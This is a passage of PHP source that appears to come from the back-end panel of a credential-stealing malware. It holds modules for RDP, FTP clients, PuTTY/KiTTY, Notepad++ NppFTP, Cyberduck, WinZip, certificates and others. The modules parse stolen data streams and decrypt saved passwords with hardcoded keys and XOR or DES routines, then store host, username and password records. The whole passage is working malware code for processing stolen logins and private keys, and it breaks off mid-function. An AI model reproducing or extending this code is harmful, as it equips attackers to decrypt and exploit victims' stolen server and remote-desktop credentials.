		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// RDP

class module_rdp extends module
{
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0001:
				$rdp_user = ztrim($stream->read_str());
				if ($id == 0x0001)
				{
					$ip = $stream->read_dword();
					$rdp_host = strval($ip & 0xff).'.'.
								strval(($ip >> 8) & 0xff).'.'.
								strval(($ip >> 16) & 0xff).'.'.
								strval(($ip >> 24) & 0xff);
				}
				else
				{
					$rdp_host = ztrim($stream->read_str());
				}
				$rdp_pass = ztrim_unicode($stream->read_str());
				$rdp_pass = unicode_to_ansi($rdp_pass);
				$rdp_host = str_replace('TERMSRV/', '', $rdp_host);

				$this->add_rdp($rdp_host, $rdp_user, $rdp_pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Now

class module_ftpnow extends module
{

	private function read_xml_item($xml_array)
	{
		$host = assign($xml_array['ADDRESS']);
		$user = assign($xml_array['LOGIN']);
		$pass = assign($xml_array['PASSWORD']);
		$port = assign($xml_array['PORT']);
		$dir = assign($xml_array['REMOTEPATH']);

		$host = utf8_decode($host);
		$user = utf8_decode($user);
		$pass = utf8_decode($pass);
		$dir = utf8_decode($dir);

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strpos(strval($key), 'SITE') !== false)
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;
		$xml_parser = new XMLParser(utf8_encode($value));
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Robo-FTP

class module_roboftp extends module
{
	private $host_collector = array();

	private function process_s_file($value)
	{
		if (!strlen($value))
			return;

		$pos = stripos($value, 'FTPLOGON');
		if ($pos !== false)
		{
			$login_str = '';
			for ($i = $pos; $i < strlen($value); $i++)
			{
				if ($value[$i] == chr(13) || $value[$i] == chr(10))
					break;
				$login_str .= $value[$i];
			}
			
			$pos = strpos($login_str, '/');
			$param_str = '';
			if ($pos !== false)
			{
				$param_str = substr($login_str, $pos);
				$login_str = substr($login_str, 0, $pos);
			}

			$user = '';
			$pass = '';
			$port = '';
			$protocol = '';

			// Get host arguments
			$params = explode('/', $param_str);

			foreach ($params as $param)
			{
				$pair = explode('=', $param);
				if (is_array($pair) && count($pair) == 2)
				{
					$pair[0] = trim($pair[0]);
					$pair[1] = trim($pair[1]);
					if (strcasecmp($pair[0], 'user') == 0)
						$user = $pair[1];
					if (strcasecmp($pair[0], 'pw') == 0)
						$pass = $pair[1];
					if (strcasecmp($pair[0], 'port') == 0)
						$port = $pair[1];
					if (strcasecmp($pair[0], 'servertype') == 0)
						$protocol = strtolower($pair[1]);
					if (strcasecmp($pair[0], 'type') == 0)
						$protocol = strtolower($pair[1]);
				}
			}

			// Extract host
			if (($pos = strpos($login_str, '\'')) !== false)
			{
				$login_str = substr($login_str, $pos+1);
			}
			if (($pos = strpos($login_str, '\'')) !== false)
			{
				$login_str = substr($login_str, 0, $pos);
			}

			if (($pos = strpos($login_str, '"')) !== false)
			{
				$login_str = substr($login_str, $pos+1);
			}
			if (($pos = strpos($login_str, '"')) !== false)
			{
				$login_str = substr($login_str, 0, $pos);
			}

			$host = trim($login_str);
			$host = trim(substr($host, 9));

			if (!strlen($host))
			{
				// No host specified
				// Use one of default hosts
				foreach ($this->host_collector as $item)
				{
					$item_user = $user;
					if (!strlen($item_user))
						$item_user = $item[1];
					$this->add_ftp(append_port(ftp_force_ssh($item[0], $protocol == 'sftp'), $port), $item_user, $pass);
				}
			} else
			{
				// Use specified host
				$this->add_ftp(append_port(ftp_force_ssh($host, $protocol == 'sftp'), $port), $user, $pass);
			}
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0010:
				// Stored sites (registry)
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_dword();
				$dir = $stream->read_str();

				if (($id & 0x10) > 0)
					$protocol = $stream->read_str();
				else
					$protocol = '';

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 'SFTP (FTP + SSH)'), $port, $dir), $user, $pass);
				array_push($this->host_collector, array($host, $user));

				break;
			case 0x0001:
				$this->process_s_file($stream->read_str());
				
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Certificate

class module_cert extends module
{
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$cert = $stream->read_str();
				$pvt_key = $stream->read_str();

				$this->add_cert($cert, $pvt_key);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// LinasFTP

class module_linasftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);

		if (strlen($encrypted_password) == 0 || (strlen($encrypted_password) % 3) != 0 || !is_num($encrypted_password))
			return '';

		$result = '';
		$XorStr = 'LINASFTP1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$start = int_divide(strlen($encrypted_password), 3);
		for ($i = 0; $i < int_divide(strlen($encrypted_password), 3); $i++)
		{
			$enc_char = intval(substr($encrypted_password, $i*3, 3));
			$result .= chr(ord($XorStr[($start+$i)%strlen($XorStr)]) ^ $enc_char);
		}

		return $result;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $this->decrypt($stream->read_str());

				$port = $stream->read_str();
				$dir = $stream->read_str();

				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Cyberduck

class module_cyberduck extends module
{
	private $pass_keypair = array();

	private function process_xml($value)
	{
		if (!strlen($value))
			return;
		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			if (isset($parsed_xml['plist']) && is_array($parsed_xml['plist']))
			{
				$plist = $parsed_xml['plist'];
				if (isset($plist['dict']) && is_array($plist['dict']))
				{
					$dict = $plist['dict'];

					if (isset($dict['key']) && is_array($dict['key']) &&
						isset($dict['string']) && is_array($dict['string']) &&
						(count($dict['key']) == count($dict['string'])))
					{
						$pairs = array();
						for ($i = 0; $i < count($dict['key']); $i++)
						{
							$pairs[$dict['key'][$i]] = $dict['string'][$i];
						}

						$proto = Utf8ToWin(assign($pairs['Protocol']));
						$host = Utf8ToWin(assign($pairs['Hostname']));
						$user = Utf8ToWin(assign($pairs['Username']));
						$pass = Utf8ToWin(assign($this->pass_keypair[$proto.'://'.$user.'@'.$host]));
						$port = Utf8ToWin(assign($pairs['Port']));
						$dir = Utf8ToWin(assign($pairs['Path']));

						$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 'sftp'), $port, $dir), $user, $pass);
					}
				}
			}
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$xml_file = $stream->read_str();

				$this->process_xml($xml_file);
				break;
			case 0x1000:
				$url = $stream->read_str();
				$pass = $stream->read_str();

				$this->pass_keypair[Utf8ToWin($url)] = $pass;

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Putty

class module_putty extends module
{
	private function rebuild_table(&$table, $base)
	{
		$p = 0;
		for ($i = 0; $i < strlen($table); $i++)
		{
			$j = (ord($base[$p])+$i) % strlen($table);
			$c = $table[$j];
			$table[$j] = $table[$i];
			$table[$i] = $c;

			$p++;

			if ($p >= strlen($base))
			{
				$p = 0;
			}
		}
	}

	private function decrypt($host, $term_type, $encrypted_pass)
	{
		if (strlen($encrypted_pass) <= 5)
			return '';

		if (!strlen($term_type))
			$term_type = 'xterm';

		$table = 'AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn0123456789+/';
		$base = substr($encrypted_pass, 0, 5);
		$encrypted_pass = substr($encrypted_pass, 5);

		$this->rebuild_table($table, $base);

		$cl = 0;
		$decrypted_pass = '';

		for ($n = 0; $n < strlen($encrypted_pass); $n++)
		{
			if ($table[strlen($table)-1] == $encrypted_pass[$n])
			{
				for ($i = 0; $i < strlen($table); $i++)
				{
					if ($table[$i] == $encrypted_pass[$n])
					{
						$cl = $cl + $i;
						break;
					}
				}

				$base = $host.$term_type.'KiTTY';
				$this->rebuild_table($table, $base);
				continue;
			}

			for ($i = 0; $i < strlen($table); $i++)
			{
				if ($table[$i] == $encrypted_pass[$n])
				{
					$decrypted_pass .= chr($cl+$i);
					break;
				}
			}

			$cl = 0;
		}

		return $decrypted_pass;
	}
    
	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();

				$port = $stream->read_str();
				if (strlen($port) == 4)
					$port = strval(data_int32($port));
				else
					$port = '';

				$term_type = $stream->read_str();

				$pass = $this->decrypt($host, $term_type, $pass);
				$this->add_ftp(append_port(ftp_force_ssh($host), $port), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Notepad++ (NppFTP plugin)

class module_notepadpp extends module
{
	private $master_pass;

	// Actually key is NppFTP00, with parity bits unset using des_set_odd_parity
	private function decrypt($encrypted_password, $decryption_key = 'OppFTQ11')
	{
		if (!strlen($encrypted_password))
			return '';

		$encrypted_password = hextostr($encrypted_password);
		if ($encrypted_password === false)
			return '';

		$descriptor = mcrypt_module_open(MCRYPT_DES, '', 'ecb', '');

		if (!$descriptor)
		{
			$this->log->add("ERR_CANNOT_INITIALIZE_MCRYPT_MODULE");
			return '';
		}

		$iv = $decryption_key;

		mcrypt_generic_init($descriptor, $decryption_key, $iv);

		$plain_text = decrypt_cfbblock($descriptor, $encrypted_password, $iv);

		mcrypt_generic_deinit($descriptor);
		mcrypt_module_close($descriptor);

		return $plain_text;
	}

	private function read_xml_item($xml_array)
	{
		if (isset($xml_array['attributes']) && is_array($xml_array['attributes']))
		{
			$attr = $xml_array['attributes'];
			
			$host = assign($attr['hostname']);
			$user = assign($attr['username']);
			$pass = assign($attr['password']);
			$port = assign($attr['port']);
			$dir = assign($attr['initialDir']);
			$protocol = assign($attr['securityMode']);

			$host = utf8_decode($host);
			$user = utf8_decode($user);
			$pass = $this->decrypt(utf8_decode($pass));
			$dir = utf8_decode($dir);
			$protocol = utf8_decode($protocol);

			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '3'), $port, $dir), $user, $pass);
		}

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function read_npp_item($xml_array)
	{
		if (isset($xml_array['attributes']) && is_array($xml_array['attributes']))
		{
			$attr = $xml_array['attributes'];
			
			$pass = trim(utf8_decode(assign($attr['MasterPass'])));
			if ($pass != '')
				$this->master_pass = $pass;
		}

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_npp_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strpos(strval($key), 'NppFTP') !== false)
					$this->read_npp_item($value);
				if (strpos(strval($key), 'Profile') !== false && strlen($this->master_pass) == 0)
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;
		$this->master_pass = '';
		$xml_parser = new XMLParser(utf8_encode($value));
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CoffeeCup Visual Site Designer

class stream_vs_designer extends stream
{
	public function read_word_str()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_word());
	}
}

class module_vs_designer extends module
{
	protected function process_account_data($account_data)
	{
		if (strlen($account_data) <= 2)
			return;

		$stream = new stream_vs_designer($account_data, $this->log);

		$ftp_count = $stream->read_word();

		while ($ftp_count-- && $stream->state && !$stream->eof())
		{
			$stream->read_word_str(); // Name
			$host = $stream->read_word_str(); // Host
			$user = $stream->read_word_str(); // User
			$pass = $stream->read_word_str(); // Pass
			$dir = $stream->read_word_str(); // Dir
			$port = $stream->read_word(); // Port
			$stream->read_skip(11); // Uknown data

			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_str();
				$dir = $stream->read_str();
				if (strlen($port) == 4)
					$port = strval(data_int32($port));
				else
					$port = '';
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
				break;
			case 0x0001:
				$account_data = $stream->read_str();
				$this->process_account_data($account_data);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTPShell

class module_ftpshell extends module
{
	protected function process_fsi_file($account_data)
	{
		if (strlen($account_data) == 0)
			return;

		$lines = parse_lines($account_data);
		$state = 0;
		foreach ($lines as $line)
		{
			switch ($state)
			{
				case 0:
					if ($line == '!~*NEWSITE*~!')
					{
						$state = 1;
						$host = '';
						$user = '';
						$port = '';
					}
					break;
				case 1:
					$state = 2;
					break;
				case 2:
					$host = $line;
					$state = 3;
					break;
				case 3:
					$port = $line;
					$state = 4;
					break;
				case 4:
					$state = 5;
					break;
				case 5:
					$user = $line;
					$state = 6;
					break;
				case 6:
					$pass = $line;

					$this->add_ftp(append_port($host, $port), $user, $pass);

					$state = 0;
					break;
			}

		}

	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$fsi_file = $stream->read_str();
				$this->process_fsi_file($fsi_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTPInfo

class module_ftpinfo extends module
{
	private function decrypt($encrypted_password, $decryption_key)
	{
		if (!strlen($encrypted_password))
			return '';

		$decoded_password = hextostr($encrypted_password);
		if ($decoded_password === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$decrypted_password = '';

		for ($i = 0; $i < strlen($decoded_password); $i++)
		{
			$decrypted_password .= chr(ord($decoded_password[$i]) ^ $i ^ ($i+1) ^ ord($decryption_key[$i%strlen($decryption_key)]));
		}

		return $decrypted_password;
	}

	private function read_xml_item($xml_array)
	{
		$host = utf8_decode(str_replace('&#160;', ' ', assign($xml_array['Address'])));
		$user = $this->decrypt(assign($xml_array['Login']), '19De^D$#');
		$pass = $this->decrypt(assign($xml_array['Password']), 'qpdm()3-');
		$port = utf8_decode(str_replace('&#160;', ' ', assign($xml_array['Port'])));

		$this->add_ftp(append_port($host, $port), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strpos(strval($key), 'data') !== false)
				{
					$this->read_xml_item($value);
				}
				$this->rec_scan_xml_array($value);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;

		$value = str_replace('encoding="Windows-1251"', 'encoding="UTF-8"', $value);
		$xml_parser = new XMLParser(utf8_encode($value));
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$xml_file = $stream->read_str();
				$this->process_xml($xml_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// NexusFile

class module_nexusfile extends module
{
	private function decrypt($cipher_text, $key = 'xxx.xiles.net')
	{
		$cipher_text = trim($cipher_text);
		if (!strlen($cipher_text) || !strlen($key))
			return '';

		$decoded_str = hextostr($cipher_text);
		if ($decoded_str === false)
		{
			// cannot decode hex string, report error
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$cipher_text = '';
		for ($i = 0; $i < strlen($decoded_str); $i++)
		{
			$cipher_text .= chr(0).$decoded_str[$i];
		}

		$crypt_array = array();
		for ($i = 0; $i < 256; $i++)
		{
			array_push($crypt_array, $i);
		}

		$tmp_array = array();
		for ($i = 0; $i < 256; $i++)
		{
			array_push($tmp_array, ord($key[$i % strlen($key)]));
		}

		$v = 0;
		for ($i = 0; $i < 256; $i++)
		{
			$v = ($tmp_array[$i] + $crypt_array[$i] + $v) & 0xff;
			$t = $crypt_array[$i];
			$crypt_array[$i] = $crypt_array[$v];
			$crypt_array[$v] = $t;
		}

		$v11 = 0;
		$v12 = 0;
		$result = '';
		for ($i = 0; $i < strlen($cipher_text); $i+=2)
		{
			$v11 = ($v11 + 1) & 0xff;
			$v12 = ($crypt_array[$v11] + $v12) & 0xff;
	
			$t = $crypt_array[$v11];
			$crypt_array[$v11] = $crypt_array[$v12];
			$crypt_array[$v12] = $t;
	
			$cipher_wide_char = ((ord($cipher_text[$i]) << 8) | (ord($cipher_text[$i+1]))) ^ 
				$crypt_array[($crypt_array[$v11]+$crypt_array[$v12]) & 0xff];
	
			$result .= chr($cipher_wide_char & 0xff).chr(($cipher_wide_char >> 8) & 0xff);
		}

		return unicode_to_ansi($result);
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$file_contents = UnkTextToAnsi($file_contents);
		$parsed_ini = parse_ini($file_contents);

		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["host"]);
			$user = assign($section["user"]);
			$pass = $this->decrypt(assign($section["pass"]));
			$dir = assign($section["remotedir"]);
			$port = assign($section["port"]);
			$servertype = assign($section["servertype"]);
			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $servertype == 'SFTP'), $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_file = $stream->read_str();
				$this->process_ini_file($ini_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FastStone Browser

class module_fs_browser extends module
{
	protected function process_db_file($file_data)
	{
		if (strlen($file_data) == 0)
			return;

		$lines = parse_lines($file_data);
		foreach ($lines as $line)
		{
			$this->add_ftp($line);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$db_file = $stream->read_str();
				$this->process_db_file($db_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CoolNovo

class module_coolnovo extends module_chrome_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WinZip

class module_winzip extends module
{
	private $password_pairs = array();
	private $ftp_dir;

	private function read_xml_item($host, $port, $xml_array)
	{
		$user = assign($xml_array['user']);
		$pass = assign($xml_array['winex']);
		if ($pass != '')
			$pass = assign($this->password_pairs[$pass]);
		$this->add_ftp(append_port_dir($host, $port, $this->ftp_dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($host, $port, $value);
		}
	}

	private function rec_scan_xml_array($xml_array, $find_dir_mode)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if ($find_dir_mode)
				{
					if (strpos(strval($key), 'filedisposition') !== false && isset($value['attributes']) && is_array($value['attributes']))
					{
						$this->ftp_dir = assign($value['attributes']['folder']);
					}
				}
				else
				{
					if (strpos(strval($key), 'site') !== false && isset($value['attributes']) && is_array($value['attributes']))
					{
						$host = assign($value['attributes']['server']);
						$port = assign($value['attributes']['port']);
						$this->read_xml_item($host, $port, $value);
					}
				}
				$this->rec_scan_xml_array($value, $find_dir_mode);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->ftp_dir = '';
			$this->rec_scan_xml_array($parsed_xml, true); // find directory
			$this->rec_scan_xml_array($parsed_xml, false); // process ftp record
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_str();
				$dir = $stream->read_str();
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
				break;
			case 0x0001:
				$encrypted_pass = $stream->read_str();
				$decrypted_pass = $stream->read_str();
				$decrypted_pass = ztrim(unicode_to_ansi($decrypted_pass));
				$this->password_pairs[$encrypted_pass] = $decrypted_pass;
				break;
			case 0x0002:
				$xml_file = $stream->read_str();
				$this->process_xml($xml_file);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Yandex.Internet

class module_yandexinternet extends module_chrome_base
{
}

// =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// MyFTP

class module_myftp extends module
{
	private function decrypt($encrypted_password)
	{
		$decrypted_password = '';
		$xor_array = array(0x85 ^ 0x31, 0x85 ^ 0x31, 0x83 ^ 0x31, 0x81 ^ 0x31);
		for ($i = 0; $i < strlen($encrypted_password); $i++)
		{
			$decrypted_password .= chr(ord($encrypted_password[$i]) ^ $xor_array[$i%sizeof($xor_array)]);
		}
		return $decrypted_password;
	}

	protected function process_ini_file($file_contents)
	{
		if (strlen($file_contents) <= 4)
			return;

		$parsed_ini = parse_ini($file_contents);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section['remote hostname']);
			$user = assign($section['remote username']);
			$pass = $this->decrypt(assign($section['remote password']));
			$port = assign($section['remote port']);
			$dir = assign($section['remote path']);
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$ini_contents = $stream->read_str();
				$this->process_ini_file($ini_contents);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// sherrod FTP

class module_sherrodftp extends module
{
	private function decrypt($encrypted_password)
	{
		$encrypted_password = trim($encrypted_password);
		if (!strlen($encrypted_password))
			return '';

		$crypt_key = base64_decode('Zz1o//1yM0o=');
		$crypt_iv = base64_decode('QAroHxawL5k=');
		$decoded_password = base64_decode($encrypted_password);
		if (!strlen($decoded_password))
		{
			$this->log->add('ERR_INVALID_BASE64_STRING');
			return '';
		}

		$plain_text = mcrypt_decrypt(MCRYPT_DES, $crypt_key, $decoded_password, MCRYPT_MODE_CBC, $crypt_iv);

		$decrypted_password = '';
		if (strlen($plain_text))
		{
			$char = $plain_text[strlen($plain_text)-1];
			while (strlen($plain_text) && ($plain_text[strlen($plain_text)-1] == $char))
				$plain_text = substr($plain_text, 0, -1);
			$decrypted_password = $plain_text;
		}
		return $decrypted_password;
	}

	private function read_xml_item($xml_array)
	{
		$host = Utf8ToWin(assign($xml_array['Host']));
		$user = Utf8ToWin(assign($xml_array['User']));
		if (!strlen($user))
			$user = Utf8ToWin(assign($xml_array['UserName']));
		$pass = Utf8ToWin($this->decrypt(assign($xml_array['Password'])));
		$port = Utf8ToWin(assign($xml_array['Port']));
		$dir = Utf8ToWin(assign($xml_array['RemoteDirectory']));
		$proto = Utf8ToWin(assign($xml_array['Protocol']));

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 'SFTP'), $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strpos(strval($key), 'HistoryItem') !== false || 
					strpos(strval($key), 'FavoriteSettings') !== false)
				{
					$this->read_xml_item($value);
				}
				$this->rec_scan_xml_array($value);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;

		$value = CutXMLEncoding($value);
		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$xml_file = $stream->read_str();
				$this->process_xml($xml_file);
				break;
			default:
